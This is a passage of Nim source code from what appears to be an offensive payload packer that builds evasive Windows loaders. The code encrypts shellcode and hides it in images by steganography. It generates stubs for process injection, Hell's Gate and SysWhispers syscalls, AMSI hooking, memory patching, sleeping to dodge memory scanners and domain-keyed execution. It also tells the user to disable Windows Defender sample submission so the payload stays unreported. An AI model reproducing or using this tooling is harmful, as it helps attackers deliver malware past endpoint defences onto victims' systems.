if(remoteMapSection and stomb):
    echo "Error: Cannot use both --mapSection and --stomb, either use one or the other"
    quit(1)

# if csout, psout and output file are defined, state outputfile cannot be used
if args["--output"]:
    if (csout and psout):
        echo "Error: Cannot use --output with --csout and --psout at the same time. Stick with the default output name."
        quit(1)

if (peload and dripallocate):
    echo "Error: Cannot use both --peload and --dripallocate, not implemented yet"
    quit(1)

if (noArgs and embeddedArguments):
    echo "Error: Cannot use both --noArgs and --arguments"
    quit(1)
if (peinject and peload):
    echo "Error: Cannot use both --peinject and --peload"
    quit(1)

if (syswhispers and hellsgate):
    echo "Error: Cannot use both --syswhispers and --hellsgate"
    quit(1)

if (hellsgate and jump):
    echo "Error: Cannot use both --hellsgate and --jump! --jump can only be used with --syswhispers"
    quit(1)

if ((csharp and shellcode) or (csharp and peload) or (peload and shellcode)):
    echo "Error: You can only use one of --csharp, --shellcode, --peload, or --peinject!"
    quit(1)

if (dllclone and dllProxy):
    echo "Error: You can only use one of --dllclone (Sideloading with Koppeling) or --dllProxy (Proxying through the legitimate DLL)!"
    quit(1)

if((existingprocessInjection == false) and (remoteinject) and jmpEntry):
    if (jmpEntryDll != "ntdll.dll"):
        echo "Error: You can only use ntdll.dll functions for SpawnInject, because the Process is suspended and only ntdll.dll is loaded. Other DLLs can only be used when using --remoteprocess for Processes, that already have the target DLL loaded!"
        quit(1)

# poolparty can only be used with remoteinject
#if (usepoolparty and remoteinject == false):
#    echo "Error: You can only use --poolparty with --remoteinject!"
#    quit(1)

# poolparty 1 fails in combination with Caro-Kann
if (usepoolparty and carokann and poolparty == 1):
    echo "Error: You cannot use --poolparty 1 with --Caro-Kann!"
    quit(1)

# cannot use poolparty in combination with threadlessinject
if (usepoolparty and threadless):
    echo "Error: You cannot use --poolparty with --threadless!"
    quit(1)



if (psout and dll_out):
    # Reflective DLL PE-Loading only works, when DLLMain is exposed, otherwise it won't work
    dllhijack = true

if(service):
    # For some reason, started services have the being debugged flag set or this check breaks the service, so we disable it
    antidebug = false

#if ((remoteinject == false) and ruylopez):
#    echo "Error: Ruy-Lopez can currently only be used in combination with --remoteinject"
#    quit(1)

# JmpEntry and Threadless cannot be used in combination, as JmpEntry creates a thread and Threadless has the goal of avoiding thread creation
if (jmpEntry and threadless):
    echo "Error: Cannot use both --jmpEntry and --threadless, as JmpEntry creates a thread and Threadless has the goal of avoiding thread creation"
    quit(1)

# same for queuapc and localcreatethread
if ((useQueueAPC or localCreateThread or callbackexecute) and threadless):
    echo "Error: Cannot (--QueueApc/--localCreateThread/-CallbackExecute) with --threadless!"
    quit(1)

# carokann can only be used in combination with CallbackExecute, localCreateThread or useQueueAPC when not injecting into a remote process
if (((remoteinject == false) and carokann and (useQueueAPC == false and localCreateThread == false and callbackexecute == false))):
    echo "Error: Cannot use --Caro-Kann without --QueueApc/--localCreateThread/-CallbackExecute when doing local injection! For some reason NtProtectVirtualMemory fails when using a direct pointer."
    echo "But this is not a problem at all, because the shellcode will be encrypted at the time of the execute primitive ;-)"
    quit(1)


# Cannot use DripAllocate or JmpEntry with Caro-Kann
if ((carokann and dripallocate) or (carokann and jmpEntry)):
    echo "Error: Cannot use --Caro-Kann with --dripallocate or --jmpEntry (yet)!"
    quit(1)

# it makes no sense to use csharp and shellcode at the same time
if (csharp and shellcode):
    echo "Error: Using --csharp and --shellcode at the same time makes no sense! Read what the options do!"
    quit(1)

# it makes no sense to use csharp and peload at the same time
if (csharp and peload):
    echo "Error: Using --csharp and --peload at the same time makes no sense! Read what the options do!"
    quit(1)

# it makes no sense to use peload and shellcode at the same time
if (peload and shellcode):
    echo "Error: Using --peload and --shellcode at the same time makes no sense! Read what the options do!"
    quit(1)

# DripAllocate, CallbackExecute, localCreateThread, QueueApc, MapSection, Caro-Kann are shellcode specific. They cannot be used in combination with csharp, interactivePS or peload
# but when csharp and peinject is set, this is possible.
if(((csharp or interactivePS) and not peinject) and (dripallocate or callbackexecute or localCreateThread or useQueueAPC or remoteMapSection or carokann)):
    echo "Error: Cannot use --csharp/--interactivePS with --dripallocate/--CallbackExecute/--localCreateThread/--QueueApc/--mapSection/--Caro-Kann!"
    echo "This is Shellcode specific options."
    quit(1)
if (peload and (dripallocate or remoteMapSection or carokann)):
    echo "Error: Cannot use --peload with --dripallocate/--mapSection/--Caro-Kann!"
    quit(1)

# ThreadlessInject and Caro-Kann cannot yet be used with syswhispers
if (syswhispers and (threadless or carokann)):
    echo "Error: Cannot use --syswhispers with --threadless/--Caro-Kann (yet)!"
    quit(1)

var
    firstwithoutlast4: string = ""
    lastFour: string = ""
    lastTwo: string = ""
    fourthtosecondlast: string = ""

if(not environmentalKey or customKey):
    #echo "Key: " & envkey
    # Lets save the last 4 characters of the string in a new variable
    lastTwo = envkey[^2..^1]
    fourthtosecondlast = envkey[^4..^3]
    lastFour = envkey[^4..^1]
    #echo "Last Four: " & lastFour
    #echo "lastTwo: " & lastTwo
    #echo "fourthtosecondlast: " & fourthtosecondlast
    # And save a key without those last 4 characters in a new one
    firstwithoutlast4 = envkey.replace(lastFour, "")
    #echo "First without last 4 :" & firstwithoutlast4


# if SkipDefaultSandBoxChecks is set, put firstwithoutlast4 into the keyFile and write it to disk. Otherwise write envkey into it
if(usekeyFile):
    if (defaultSandBoxChecks):
        if (antidebug):
            for i in keyFile:
                writeFile(i, envkey)
        else:
            for i in keyFile:
                writeFile(i, firstwithoutlast4)
    else:
        for i in keyFile:
            writeFile(i, envkey)


if (peload and embeddedArguments):
    verbose = true # workaround, something in DInvoke+NoVerbose breaks the arguments

when system.hostOS == "windows":
    var sampleSubmissionValue = execCmdEx("powershell.exe $mpPreference = Get-MpPreference; if ($mpPreference.SubmitSamplesConsent -in 0, 1, 3) { Write-Host 'Enabled' }")
    echo "[*] Checking Windows Defender Sample Submission..."
    echo "[*] Windows Defender Sample Submission is: " & sampleSubmissionValue[0]
    if (sampleSubmissionValue[0].contains("Enabled")):
        echo "[-] Windows Defender Sample Submission is enabled. Please disable it!"
        echo "[*] You can fully disable it with the following Powershell command: \r\nSet-MpPreference -SubmitSamplesConsent 2"
        quit(1)


if (peload or peinject):
    let stream = newFileStream(filename, mode = fmRead)
    defer: stream.close()
    # Check magic string
    var magic_string: array[2, char]
    discard stream.readData(magic_string.addr, 2)
    if magic_string != "MZ":
        echo "[-] No Magic bytes found, file is not a PE"
        quit(1)

when system.hostOS == "windows":
    if (csharp):
        if (interactivePS):
            var newPath = packerPath & "\\pwnPowershell\\RunSpace.exe"
            blob = readFile(newPath)
        else:
            blob = readFile(filename)
            var blobbytes = toByteSeq(blob)
            var code = fmt"""
            using System;
            public class Check {{
              public void ifAssembly() {{
                object asd = System.Reflection.AssemblyName.GetAssemblyName(@"{filename}");
              }}
            }}
            """
            try:
                var res = compile(code)
                var o = res.CompiledAssembly.new("Check")
                o.ifAssembly()
            except:
                echo "[-] Error - you didn't specify a C# assembly!"
                noassembly = true

            if (noassembly):
                quit(1)
else:
    # Temporary fix for error using --csharp in linux (and Docker image).
    # We get an IndexDefect error because 'blob' is never set, so we set it here when in linux
    # Probably need to the linux way of checking the C# assembly in here, somehow.
    if (filename == ""):
        blob = ""
    else:
        blob = readFile(filename)
    # End temp fix
    if (interactivePS):
        var newPath = packerPath & "/pwnPowershell/RunSpace.exe"
        blob = readFile(newPath)


#Read file and if PE convert to shellcode before
if (peinject):
    when system.hostOS == "windows":
        var exist: bool = fileExists(fmt"{packerPath}\donut\donut.exe")
    else:
        var exist: bool = true
    if (exist):
        when system.hostOS == "windows":
            if (embeddedArguments):
                echo "Donut command: "
                echo fmt"{packerPath}\donut\donut -b 1 -p ""{arguments}"" -o tmpshellcode.bin --input:{filename}"
                discard os.execShellCmd(fmt"{packerPath}\donut\donut -b 1 -p ""{arguments}"" -o tmpshellcode.bin --input:{filename}")
            else:
                discard os.execShellCmd(fmt"{packerPath}\donut\donut -b 1 -o tmpshellcode.bin --input:{filename}")
            if (sgn):
                if (compileX86):
                    discard os.execShellCmd(fmt"{packerPath}\sgn\sgn.exe -c 8  -o tmpshellcode.bin tmpshellcode.bin")
                else:
                    discard os.execShellCmd(fmt"{packerPath}\sgn\sgn.exe -a 64 -c 8  -o tmpshellcode.bin tmpshellcode.bin")
                sgn = false
        elif system.hostOS == "linux":
            if(embeddedArguments):
                echo "Donut command: "
                echo fmt"donut --input:{filename} -b 1 -p '{arguments}' -o tmpshellcode.bin"
                discard os.execShellCmd(fmt"donut --input:{filename} -b 1 -p '{arguments}' -o tmpshellcode.bin")
            else:
                echo "Donut command: "
                echo fmt"donut --input:{filename} -b 1 -o tmpshellcode.bin"
                discard os.execShellCmd(fmt"donut --input:{filename} -b 1 -o tmpshellcode.bin")
            if (sgn):
                if (compileX86):
                    discard os.execShellCmd(fmt"{packerPath}/sgn/sgn -c 3  -o tmpshellcode.bin tmpshellcode.bin")
                else:
                    discard os.execShellCmd(fmt"{packerPath}/sgn/sgn -a 64 -c 3  -o tmpshellcode.bin tmpshellcode.bin")
                sgn = false
        blob = readFile("tmpshellcode.bin")
        shellcode = true
        peload = false
    else:
        echo fmt"'Donut' not found. You need to download/install according to the README"
        quit()
elif(sgn):
    if (compileX86):
        discard os.execShellCmd(fmt"{packerPath}\sgn\sgn.exe -c 8  -o tmpshellcode.bin {filename}")
    else:
        discard os.execShellCmd(fmt"{packerPath}\sgn\sgn.exe -a 64 -c 8  -o tmpshellcode.bin {filename}")
    blob = readFile("tmpshellcode.bin")
elif(csharp == false):
    blob = readFile(filename)

var
    data: seq[byte] = toByteSeq(blob)

    ectx: ECB[aes256]
    key: array[aes256.sizeKey, byte]

if (not big) and (len(data) > largePayloadThreshold) and (not retrieveFromFile) and (not retrieveFromURL):
    big = true
    echo fmt"[*] Payload is larger than 5MB; enabling --large compile settings"

proc toString(bytes: openarray[byte]): string =
    result = newString(bytes.len)
    copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)

#[
proc xorFunc*(buf: ptr uint32; bufSize: size_t; xorKey: uint32) =
  var buf32: ptr uint32 = cast[ptr uint32](buf)
  var bufSizeRounded: auto = (bufSize - (bufSize mod size_t(sizeof((uint32))))) div 4
  var i: size_t = 0
  while i < bufSizeRounded:
    buf32[] = buf32[] xor xorKey
    buf32 = buf32 + 1
    inc(i)
]#

# if shellcodelength bigger than 5 MB and stomb is used, interrupt the user and ask if he really wants to continue as the RX size of chakra.dll is only that size it may cause a crash
if((stomb) and (data.len > 5242880)):
    echo "Warning: The shellcode is bigger than 5 MB and you are using Module Stomping. This may cause a crash, because the RX size of chakra.dll is only that size. Do you want to continue? (y/n)"
    var answer = readLine(stdin)
    if (answer == "y"):
        echo "Continuing..."
    else:
        echo "Aborting..."
        quit(1)

# remoteinject and localcreatethread cannot be used in combination
if (remoteinject and localCreateThread):
    echo "Error: Cannot use --remoteinject with --localCreateThread, makes no sense!"
    quit(1)

# sgn and caro-kann cannot be used together as caro-kann cannot decrypt properly than
if (sgn and carokann):
    echo "Error: Cannot use --sgn with --Caro-Kann, will lead to crash!"
    quit(1)

# Payload bigger than 0.5 MB and DripAllocate give a warning, that it may takes ages to start or even crash the system
if((dripallocate) and (data.len > 524288)):
    echo "Warning: The shellcode is bigger than 0.5 MB and you are using DripAllocate. This may take ages to start or even crash the system. Do you want to continue? (y/n)"
    var answer = readLine(stdin)
    if (answer == "y"):
        echo "Continuing..."
    else:
        echo "Aborting..."
        quit(1)

# QueueApc and ThreadLessInject with remoteinject makes no sense
if ((remoteinject) and (useQueueAPC and threadless)):
    echo "Error: Cannot use --remoteinject with --QueueApc/--threadless, makes no sense!"
    quit(1)

var originalScLength: int = data.len

if(carokann):
    # The Caro-Kann shellcode decryptprotect.bin contains an egg with the xor decryption key, which looks like this
    # 0x14, 0xFF, 0x13, 0xDE | we want to search for this egg and replace it with a random different key.
    # The egg is 4 bytes long, so we need to generate a random 4 byte key
    
    # when Caro-Kann, Stomb and ThreadlessInject are used, decryptprotectfull.bin should be used. Otherwise decryptprotect.bin
    
  
    var hookShellcode: string
    when defined(carokannthread):
        const slurpValue = slurp"decryptprotectthread.bin"
        hookShellcode = slurpValue
    else:
        const slurpValue = slurp"decryptprotect.bin"
        hookShellcode = slurpValue
    
    
    var hookShellcodeBytes: seq[byte] = toByteSeq(hookShellcode)

    var randomKey = newSeq[byte](4)
    for i in 0 .. 3:
        randomKey[i] = byte(rand(int(0x00) .. int(0xFF)))
    
    # put the bytes byte 0xAC, 0xF4, 0x0F, 0x96 into the randomKey sequence
    randomKey[0] = 0x14
    randomKey[1] = 0xFF
    randomKey[2] = 0x13
    randomKey[3] = 0xDE # only for testing purposes

    # Now we need to search for the egg and replace it with the random key. The resulting shellcode will be written to disk as decryptprotect.bin.tmp
    var eggIndex = 0
    for i in 0 ..< hookShellcodeBytes.len:
        if (hookShellcodeBytes[i] == 0x14 and hookShellcodeBytes[i+1] == 0xFF and hookShellcodeBytes[i+2] == 0x13 and hookShellcodeBytes[i+3] == 0xDE):
            eggIndex = i
            break
    
    echo "Found egg for the Caro-Kann shellcode key at index: " & $eggIndex
    echo "\r\nReplacing egg with random key: " & $randomKey & "\r\n"
    hookShellcodeBytes[eggIndex] = randomKey[0]
    hookShellcodeBytes[eggIndex+1] = randomKey[1]
    hookShellcodeBytes[eggIndex+2] = randomKey[2]
    hookShellcodeBytes[eggIndex+3] = randomKey[3]

    eggIndex = 0
    for i in 0 ..< hookShellcodeBytes.len:
        if (hookShellcodeBytes[i] == 0xDE) and (hookShellcodeBytes[i+1] == 0xAD) and (hookShellcodeBytes[i+2] == 0x10) and (hookShellcodeBytes[i+3] == 0xAF):
            eggIndex = i
            break

    var shellcodeSize: DWORD = cast[DWORD](data.len)
    copyMem(unsafeAddr hookShellcodeBytes[eggIndex], unsafeAddr shellcodeSize, 4)


    writeFile("decryptprotect.bin.tmp", toString(hookShellcodeBytes))

    for i in 0 ..< data.len:
        # check if data.len is divisible by 4, if not, we need to do the last 3 bytes with the first byte of the key. Thats what the c shellcode function does as well.
        var isDivisible: bool = false
        var rest: int = data.len mod 4
        if (data.len mod 4 == 0):
            isDivisible = true
        #echo "Rest: " & $rest & "\r\n"
        #echo "Data len: " & $data.len & "\r\n"
        if(isDivisible):
            data[i] = data[i] xor (randomKey[i mod 4])
            #echo "Encrypting with Key byte: " & toHex(randomKey[i mod 4]) & " at index: " & $i & "\r\n"
        else:
            if (i < data.len - rest):
                data[i] = data[i] xor (randomKey[i mod 4])
                #echo "Encrypting with Key byte: " & toHex(randomKey[i mod 4]) & " at index: " & $i & "\r\n"
            else:
                data[i] = data[i] xor (randomKey[0] and 0xFF)
                #echo "Encrypting with Key byte: " & toHex(randomKey[0]) & " at index: " & $i & "\r\n"
    
    
    # write new data blob to disk as datablob.bin to verify the encryption went correctly.
    #writeFile("datablob.bin", toString(data))




# AES256 block size is 128 bits or 16 bytes, so we need to pad plaintext with
# 0 bytes. Not the best crypto, but to be honest - who tries to break AES256??
if ((len(data) mod aes256.sizeBlock) != 0):
    echo "[*] Payload length not a multiple of the BlockSize: ", aes256.sizeBlock
    echo "[*] Length: " & $len(data)
    echo "[*] Padding payload..."
    data = data & newSeq[byte](aes256.sizeBlock - (len(data) mod aes256.sizeBlock))
    echo "[*] New Length: " & $len(data)
    
var
    plaintext = newSeq[byte](len(data))
    enctext = newSeq[byte](len(data))


copyMem(addr plaintext[0], addr data[0], len(data))
echo "[*] Plaintext length: " & $len(plaintext)
echo "[*] Enctext length: " & $len(enctext)

# Convert Key to byte sequence
#envkey = reverse(envkey)
var expandedkey = toByteSeq(toHex(envkey))
echo "[*] Hex key: " & cast[string](toHex(envkey))
echo "[*] Expanded Hex key: " & repr(expandedkey)
#expandedkey = toOpenArray(expandedkey).reverse()


# AES256 key size is 256 bits or 32 bytes, so we need to pad key with
# 0 bytes. Not the best crypto, but to be honest - who tries to break AES256??
if ((len(expandedkey) mod (aes256.sizeBlock * 2)) != 0):
    echo "[*] Key length not a multiple of KeySize: ", (aes256.sizeBlock * 2)
    echo "[*] Length: " & $len(expandedkey)
    echo "[*] Padding Key..."
    expandedkey = expandedkey & newSeq[byte]((aes256.sizeBlock * 2) - (len(expandedkey) mod (aes256.sizeBlock * 2)))
    # Length cannot be > 32 bytes
    if (len(expandedkey) > (aes256.sizeBlock * 2)):
        expandedkey = expandedkey[0..(aes256.sizeBlock * 2) - 1]
        echo "[*] New New Length: " & $len(expandedkey)

copyMem(addr key[0], addr expandedkey[0], len(expandedkey))
ectx.init(key)
ectx.encrypt(plaintext, enctext)
ectx.clear()


var content: string = cast[string](enctext)
# if shellcodeFile[0] contains a PATH with \, we remove the path including the last \ so that the encrypted payload will land in the CWD
var outStringShellcode: string = ""
if (shellcodeFile[0].contains("\\")):
    # replace everything before the last \ with nothing
    # Get the filename from the path
    let (_, filename) = splitPath(shellcodeFile[0])
    outStringShellcode = filename
else:
    outStringShellcode = shellcodeFile[0]

echo "Writing encrypted blob to disk: " & outStringShellcode
writeFile(outStringShellcode, content)


### stego stuff, credit to @OffenseTeacher, https://github.com/OffenseTeacher/Steganim

import streams


proc nthBitPresent(b: byte,n: int): bool =
    var a = 1 shl n
    var b = int(b) and a
    return b != 0

proc extractByte(a: seq[bool]): byte =

    var b: byte = 0
    for i in 0 .. 7:
        if a[i]:
            b = b or (byte)(1 shl (7 - i))
        else:
            b = b or (byte)(0 shl (7 - i))
    return b

proc extractBytes(a: seq[byte],b: int): seq[byte] =
    
    var c: int = b

    var d: seq[bool] = newSeq[bool](0)
    for i in c .. len(a) - 1:
        d.add(nthBitPresent(a[i], 0))
    var e: seq[byte] = newseq[byte](0)

    for i in countup(0, len(d), 8):
        if len(d) - i > 8:
            var tmp : byte = extractByte(d[i .. i + 8])
            e.add(tmp)
    e = e[1 .. (e.len - 1)]
    var f = toByteSeq("\t")[0]
    var idx = e.find(f);
    var payloadLengthBytes: seq[byte] = e[0 .. idx - 1]
    var p: int
    var msg_len = (cast[ptr int32] (addr payloadLengthBytes[p]))[]
    var finalPayload = e[idx+1 .. (idx + msg_len)]
    return finalPayload

proc getBytesFromFile(path: string): seq[byte] =
    try:
        var
            s = newFileStream(path, fmRead)
            valSeq = newSeq[byte]()
        while not s.atEnd:
            let element = s.readUInt8
            valSeq.add(element)
        s.close()
        return valSeq
    except:
        echo "!! ", path, " was not found !!"
        quit(1)

proc mergeBaseImageWithPayload1BitPerByte(my_byte: byte, ends_in_one: bool): byte =
    var new_byte: byte = my_byte;
    if ends_in_one:
        if not nthBitPresent(my_byte, 0):
            new_byte = cast[byte](my_byte + 1)
    else:
        if (nthBitPresent(my_byte, 0)):
            new_byte = cast[byte](my_byte - 1)
    return new_byte;

proc createSteganoImage(payloadPath: string, baseImagePath: string, outputFile: string): void =
    var 
        payloadBytes: seq[byte] = getBytesFromFile(payloadPath)
        baseImageBytes: seq[byte] = getBytesFromFile(baseImagePath)
        delimiter = toByteSeq("\t")[0]
        start_offset: int = 50
        payloadLengthInBytes = cast[array[sizeof(int32), byte]](payloadBytes.len)
        payloadLengthInBytesReverse: seq[byte] = @[]
    for r in countdown(payloadLengthInBytes.len - 1, 0):
        payloadLengthInBytesReverse.add(payloadLengthInBytes[r])
    payloadBytes = delimiter & payloadBytes

    for b in payloadLengthInBytesReverse:
        payloadBytes = b & payloadBytes

    payloadBytes = delimiter & payloadBytes
    var bits: seq[bool] = newSeq[bool](0)

    for i in countup(0, payloadBytes.len - 1):
        for j in countdown(7,0):
            bits.add(nthBitPresent(payloadBytes[i], j))

    if len(bits) > len(baseImageBytes) + start_offset:
        echo "Payload too big for the image"
        quit(1)

    for i in 0 .. bits.len - 1:
        baseImageBytes[i + start_offset] = mergeBaseImageWithPayload1BitPerByte(baseImageBytes[i + start_offset], bits[i])

    var fHandle = open(outputFile, fmWrite)
    discard writeBytes(fHandle,baseImageBytes,0,baseImageBytes.len)


if(useStego):

    if (stegofile.contains("http")):
        # remove everything before the first / plus the / itself
        var imageName = stegofile[stegofile.find("/", 0) + 1 .. stegofile.len - 1]
        echo "[*] Downloading Image from: " & stegofile
        echo "[*] Image Name: " & imageName

    var 
        inputPayload = outStringShellcode
        inputBaseImage = stegofile
        outputSteganoFile = stegofile
    echo "[*] Creating Stegano Image:"
    echo "[*] Payload: " & inputPayload
    echo "[*] Base Image: " & inputBaseImage
    echo "[*] Output Image: " & outputSteganoFile
    createSteganoImage(inputPayload, inputBaseImage, outputSteganoFile)


### stego stuff end


if(macPayload):
    echo "[*] Converting Shellcode to MAC-Adresses: "
    echo fmt"{packerPath}\bin2mac\bin2mac.exe {packerPath}\{outStringShellcode}"
    when system.hostOS == "linux":
        macPayloadString = exec_cmd_ex(fmt"{packerPath}/bin2mac/bin2mac.py {packerPath}/{outStringShellcode}")[0]
    when system.hostOS == "windows":
        macPayloadString = exec_cmd_ex(fmt"{packerPath}\bin2mac\bin2mac.exe {packerPath}\{outStringShellcode}")[0]
    #echo macPayloadString


if(AMSICreateSectionHook):
    echo "\r\n[*] Encrypting NtCreateSection-Hook Shellcode: \r\n"
    var
        data2: seq[byte] = toByteSeq(readFile("hook.bin"))

        ectx2: ECB[aes256]
    
    # AES256 block size is 128 bits or 16 bytes, so we need to pad plaintext with
    # 0 bytes. Not the best crypto, but to be honest - who tries to break AES256??
    if ((len(data2) mod aes256.sizeBlock) != 0):
        echo "[*] Payload length not a multiple of the BlockSize: ", aes256.sizeBlock
        echo "[*] Length: " & $len(data2)
        echo "[*] Padding payload..."
        data2 = data2 & newSeq[byte](aes256.sizeBlock - (len(data2) mod aes256.sizeBlock))
        echo "[*] New Length: " & $len(data2)
        
    var
        plaintext2 = newSeq[byte](len(data2))
        enctext2 = newSeq[byte](len(data2))

    copyMem(addr plaintext2[0], addr data2[0], len(data2))
    echo "[*] Plaintext length: " & $len(plaintext2)
    echo "[*] Enctext length: " & $len(enctext2)

    ectx2.init(key)
    ectx2.encrypt(plaintext2, enctext2)
    ectx2.clear()

    echo "Writing encrypted Hook-blob to disk: "

    var content2: string = cast[string](enctext2)
    writeFile("enchook.blob", content2)

proc getRandStub (): string =
  var randName: string = rndStr(rand(10..25))
  var randValues: string = rndStr(rand(50..500))
  let randstub = fmt"""

    var {randName}: string = obf("{randValues}")


"""
  return randstub

proc getRandStubNoTab (): string =
  var randName: string = rndStr(rand(10..25))
  var randValues: string = rndStr(rand(50..500))
  let randstub = fmt"""

var {randName}: string = obf("{randValues}")


"""
  return randstub

let PatchargsFuncs = fmt"""
    var arguments: string = "{arguments}"
    when defined(args):
        proc patchMemory(targetAddr: PVOID, data: openArray[byte]): void =
            var oldProtect: DWORD = 0
            var lpAddress = targetAddr
            var dwSize = cast[SIZE_T](len(data))
            var status: NTSTATUS = 0x00000000
            var hProcess = -1
            when defined(Syswhispers):
                status =  uashdiasdj(hProcess, addr lpAddress, addr dwSize ,0x40, addr oldProtect)
                when defined(verbose):
                    echo obf("NtProtectVirtualMemory: "),toHex(status)
                if (status != 0):
                    when defined(verbose):
                        echo obf("[-] Failed to change memory protections.")
                    when defined(verbose):
                        echo toHex(status)
            else:
                when defined(HellsGate):
                    if getSyscall(ntProtectTable):                
                        syscall = ntProtectTable.wSysCall
                    else:
                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
                status =  NtProtectVirtualMemory(hProcess, addr lpAddress, addr dwSize ,0x40, addr oldProtect)
                if (status != 0):
                    echo obf("[-] Failed to change memory protections.")
                    echo toHex(status)
                
            when defined(Hellsgate):
                if getSyscall(ntWriteTable):
                    syscall = ntWriteTable.wSysCall
                else:
                    echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
            var scLength: SIZE_T = SIZE_T(len(data))
            var bytesWritten: SIZE_T
                
            when defined(Syswhispers):
                status = oqiazasusjk(hProcess,targetAddr,unsafeAddr data[0],scLength,addr bytesWritten)
            else:
                status = NtWriteVirtualMemory(hProcess,targetAddr,unsafeAddr data[0],scLength,addr bytesWritten)
                echo obf("NtWriteVirtualMemory: "),toHex(status)
                if (status != 0):
                    echo obf("[-] Failed to write arguments.")
                    echo toHex(status)
                else:
                    echo obf("[+] Arguments written successfully.")
            when defined(Syswhispers):
                status = uashdiasdj(hProcess, addr lpAddress, addr dwSize ,oldProtect, addr oldProtect)
            else:
                when defined(HellsGate):
                    if getSyscall(ntProtectTable):                
                        syscall = ntProtectTable.wSysCall
                    else:
                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
                success =  NtProtectVirtualMemory(hProcess, addr lpAddress, addr dwSize ,oldProtect, addr oldProtect)
    when defined(args):
        proc patchArgFunctionMemory(funcAddr: pointer, pNewCommandLine: pointer): void =
            when defined x86:
                var shellcode: seq[byte] = @[byte(0xb8)] # movabs rax, new_cmd
            else:
                var shellcode: seq[byte] = @[byte(0x48), byte(0xb8)] # movabs rax, new_cmd
            for t in cast[array[sizeOf(pointer), byte]](pNewCommandLine):
                shellcode.add t        
            shellcode.add(byte(0xc3)) # ret
            patchMemory(funcAddr, shellcode)
"""





let LoadAssemblyStub = fmt"""



    # Actually decrypt after doing everything else for better evasion.
    ptrEncText = cast[ptr byte](addr enctext[0])
    ptrDecText = cast[ptr byte](addr dectext[0])
    decryptlate()
    discard calcHard()
    var assembly = load(dectext)
    discard calcHard()

    when defined(lib_only):
        # https://stackoverflow.com/questions/12161813/running-a-dll-using-rundll32-exe-no-output-or-error-seen
        # https://stackoverflow.com/questions/432832/what-is-the-different-between-api-functions-allocconsole-and-attachconsole-1 to get DLL Console output
        when defined(ruylopez):
            if(amISpawned()):
                when defined(lib_only):
                    AttachConsole(DWORD(paramStr(2).parseInt()))
                else:
                    AttachConsole(-1)
        else:
            AttachConsole(-1)

    when defined(Fluctuate):
        g_fluctuationData.shellcodeAddr = dectext[0].addr
        g_fluctuationData.shellcodeSize = SIZE_T(dectext.len)
        # Will change the hardcoded key later on
        when defined(amd64):
            g_fluctuationData.encodeKey = 0x1337DE4D
        when defined(i386):
            g_fluctuationData.encodeKey = 0x1337
        g_fluctuationData.currentlyEncrypted = false
        g_fluctuationData.protect = PAGE_READWRITE
        g_fluctuate = FluctuateToRW
        if (hookSleep()):
            when defined(verbose):
                echo obf("Hooked Sleep successfully for Shellcode-Fluctuation!")
        else:
            when defined(verbose):
                echo obf("Failed to hook Sleep for Shellcode-Fluctuation!")

    var cmd: seq[string]
    var i = 1
    discard calcHard()

    when defined(args):
        cmd.add({arguments.split(" ")})
    while i <= paramCount():
        discard calcHard()
        when defined(lib_only):
            if (i != 1):
                # first parameter is rundll32.exe,Funcname (skip that)
                cmd.add(paramStr(i))
        else:
            cmd.add(paramStr(i))
        inc(i)
    when defined(ruylopez):
        when defined(localinject):
            if(amISpawned()):
                # for lib_only remove the 2nd argument from cmd, as this is the random integer fake param
                when defined(lib_only):
                    cmd = cmd[1 .. cmd.len - 1]
                else:
                    # remove the 1st parameter
                    cmd = cmd[1 .. cmd.len - 1]
"""

let LoadAssemblyStubArgs = """
    var arr = toCLRVariant(cmd, VT_BSTR)
    discard calcHard()
    assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))
    discard calcHard()

when defined(defaultMain):
    when not defined(service):
        when defined(notcloned) :
            when not defined(proxy):
                when not defined(xll):
                    when not defined(perfecthijack):
                        discard main(nil)
"""

let LoadAssemblyStubNoArgs = """
    discard calcHard()
    var arr = toCLRVariant([""], VT_BSTR) # Passing no arguments
    discard calcHard()
    discard assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))

when not defined(proxy):
    when not defined(service):
        when not defined(cloned):
            when not defined(xll):
                when not defined(perfecthijack):
                    discard main(nil)

when defined(defaultMain):
    when not defined(service):
        when defined(notcloned) :
            when not defined(xll):
                when not defined(perfecthijack):
                    discard main(nil)
"""


let SleepStubSecond * = fmt"""
when defined(verbose):
    echo obf("[*] Sleeping to avoid in memory scanners")
when defined(verbose):
    echo {sleeptime}
HowMuchTimeWouldYoulikeToSleep({sleeptime}) 
"""

let DomainCheckStub1 * = fmt"""
when isMainModule:
    var localdomain: string = getDomain()
    if(localdomain != "{targetdomain}"):
        when defined(verbose):
            echo obf("Domain not EQUAL, target / local :") & $localdomain & " / {targetdomain}"
        quit()
"""

let ShellcoderemoteinjectStub_customprocseccond * = fmt"""
    var remoteprocesses: seq[string] = {remoteprocesses}
"""

let ShellcodeFromFileStub * = fmt"""

    var fileHandle: File
    var encString: string
    for f in {shellcodeFile}:
        try:
            fileHandle = open(f, fmRead)
            encString = fileHandle.readAll()
            break
        except:
            when defined(verbose):
                echo obf("[-] Failed to open file: ") & f
    var enctext: seq[byte] = toByteSeq(encstring)
    var dectext = newSeq[byte](len(enctext))

"""


let ServiceDllStub * = """

const
  SVCNAME* = obf("PackerService")

var serviceStatus*: SERVICE_STATUS

var serviceStatusHandle*: SERVICE_STATUS_HANDLE

var stopEvent*: HANDLE

proc UpdateServiceStatus*(currentState: DWORD): VOID =
  serviceStatus.dwCurrentState = currentState
  SetServiceStatus(serviceStatusHandle, addr(serviceStatus))

proc ServiceHandler*(controlCode: DWORD; eventType: DWORD; eventData: LPVOID;
                    context: LPVOID): DWORD =
  case controlCode
  of SERVICE_CONTROL_STOP:
    serviceStatus.dwCurrentState = SERVICE_STOPPED
    SetEvent(stopEvent)
  of SERVICE_CONTROL_SHUTDOWN:
    serviceStatus.dwCurrentState = SERVICE_STOPPED
    SetEvent(stopEvent)
  of SERVICE_CONTROL_PAUSE:
    serviceStatus.dwCurrentState = SERVICE_PAUSED
  of SERVICE_CONTROL_CONTINUE:
    serviceStatus.dwCurrentState = SERVICE_RUNNING
  of SERVICE_CONTROL_INTERROGATE:
    discard
  else:
    discard
  UpdateServiceStatus(SERVICE_RUNNING)
  return NO_ERROR

proc ExecuteServiceCode*(): VOID =
  stopEvent = CreateEvent(nil, TRUE, FALSE, nil)
